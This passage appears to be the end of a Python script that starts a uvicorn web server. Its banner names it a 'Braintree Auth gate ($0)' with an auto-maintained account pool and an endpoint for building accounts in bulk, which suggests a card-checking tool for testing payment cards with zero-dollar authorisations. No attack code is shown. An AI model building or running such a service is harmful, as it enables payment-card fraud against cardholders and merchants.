        print("Please run: pip install uvicorn")
        sys.exit(1)

    port = int(os.environ.get("PORT", 8000))
    auto_maintain_pool()

    print(f"BowlerX Braintree Auth gate ($0) | pool:{len(load_pool())} | port:{port}")
    print(f"Build accounts: /b3?acc=500")
    uvicorn.run(app, host="0.0.0.0", port=port)
